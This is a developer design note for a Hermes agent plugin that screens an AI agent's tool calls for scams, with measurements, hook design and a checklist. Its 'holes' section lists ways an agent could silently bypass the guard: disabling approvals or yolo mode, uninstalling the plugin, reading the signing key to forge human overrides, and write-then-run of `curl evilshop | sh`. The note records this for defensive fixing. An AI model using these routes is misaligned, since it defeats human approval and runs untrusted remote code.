# scamgate as a Hermes plugin

Status: in progress on `feat/hermes-plugin` (Oct 2026).

## Decision: catalog plugin, not a core PR

- Hermes doesn't take third-party integrations into core. `plugins/AGENTS.md` says "Plugins never touch
  core", and CONTRIBUTING has "Third-Party Product Integrations: Ship as a Standalone Plugin".
- The designed path is the **plugin catalog** (`plugin-catalog/<name>.yaml`):
  - It takes owner submissions, pinned to an exact 40-character commit SHA.
  - It's human-reviewed.
  - `hermes plugins validate` (the security scan plus a capability probe) runs in CI at the pinned commit.
- Hermes's own approval layer still has open holes upstream:
  - #81101 and #59293: `hermes config set approvals.mode off` is not guarded.
  - #104059 was closed as not planned.
  - A plugin can close these for its users today without touching core.

Measured on this PC (Hermes v0.21.5):

| | per tool call |
|---|---|
| shell hook (`scamgate-hook` subprocess) | ~552 ms |
| in-process plugin (`pre_tool_call`) | ~9.7 ms |

A plugin can also do things a shell hook can't:
- see a per-chat `/yolo`;
- check where a page redirected to after it loaded (`transform_tool_result`);
- register native check tools, so no MCP server or `uv` subprocess is needed;
- read the agent's working directory;
- offer `/scamgate` in chat.

Hermes APIs used, and the release each first appears in:
- `pre_tool_call` returning `approve` → `request_tool_approval`: v0.18.1.
- `is_approval_bypass_active_for_session`: v0.19.1.
- `transform_tool_result`: v0.18.1.

So the plugin needs `requires_hermes: ">=0.19.1"`.

## Holes found during this review (confirmed silent on v0.2.0)

1. **Hermes safety switches.** All of these went through:
   - `hermes config set approvals.mode off`
   - `approvals.cron_mode approve`
   - `hermes chat -q ... --yolo`
   - `HERMES_YOLO_MODE=1`
   - `hermes plugins uninstall scamgate`
   - `plugins.hook_callback_timeout`
   - Hermes's own `detect_dangerous_command` doesn't flag any of these either.
2. **The signing key could be read.** `state.key` was readable (`cat`, `read_file`), and with it an agent
   can forge "human" overrides and payees.
3. **Write-then-run.**
   - `curl evilshop | sh` asks.
   - But `bash fetch.sh` with the same code inside was silent.
   - So was `python run.py`, where run.py opens a base64-hidden URL.
4. **Cron scripts.** `cronjob_manage` with `script=` and `no_agent=true` runs later with no agent, so no
   hook ever sees it.
5. **Files other tools run.** Makefile, package.json scripts, git hooks, CI files and `conftest.py` were
   never content-checked, only their paths.
6. **Shell hooks are ignored under `/yolo`.** Under `/yolo` or `approvals.mode: off`, Hermes auto-approves
   every plugin and shell-hook "approve", so every scamgate ask silently became allow.

Not a hole: `execute_code` nested tool calls go through `handle_function_call` with the hook on.

## Design

The plugin lives in the package itself (`src/scamgate/plugin.yaml`, with `register()` in `__init__.py`).
The catalog entry uses `subdir: src/scamgate`, so the install contains only the package: no tests, and the
scanner only sees the shipped code. Internal imports are relative, so the same code loads as `scamgate`
(pip) or as `hermes_plugins.scamgate` (Hermes).

`plugin.py` registers:
- **`pre_tool_call`**: the same `hook.handle()` the shell hook uses, in-process.
  - Under `/yolo`, `approvals.mode: off` or cron `approve`, an ask becomes a block. The block message tells
    the user how to approve. Setting: `when_approvals_off: block` (default) or `allow`.
- **`post_tool_call`**: records the outcome of each ask in the ask log.
- **`transform_tool_result`**: checks the *final* URL after `browser_navigate`/`browser_back` (and clicks
  when the backend reports a URL) and each `web_extract` result.
  - If the destination is on a known-bad list, the page content is hidden and replaced with a warning.
  - This closes "redirects after the pre-check" for the browser and extract tools.
- **Tools**: `scamgate_check_url` and `scamgate_check_payment`, the native version of the MCP server.
- **`/scamgate status|review|update`**: read-only, except `update`, which downloads feeds (data only, never
  code).
- **`hermes scamgate ...`**: the full CLI. `promote` and `record-payment` still need a person at a terminal.

Dependencies: `pyyaml` and `pydantic`, both bounded. `typer` is only needed for the CLI.

## Checklist

- [x] Tests for holes 1–5 (`tests/test_hermes_holes.py`), written first
- [x] Fix the hook: Hermes safety switches, key reads, write-then-run, cron scripts, runnable-file content,
      own check tools exempt, other profiles' config, broken `https:/` and `https:///` links
- [x] Relative imports; default blocklist inside the package
- [x] `plugin.yaml` and `plugin.py`, plus `tests/test_plugin.py` (fake ctx). 630 tests pass.
- [ ] Load through Hermes's real `PluginManager` in a scratch `HERMES_HOME`; `hermes plugins validate`
- [ ] Docs: site, CHANGELOG 0.3.0
- [ ] Release v0.3.0; catalog entry PR to NousResearch/hermes-agent pinned to the release commit
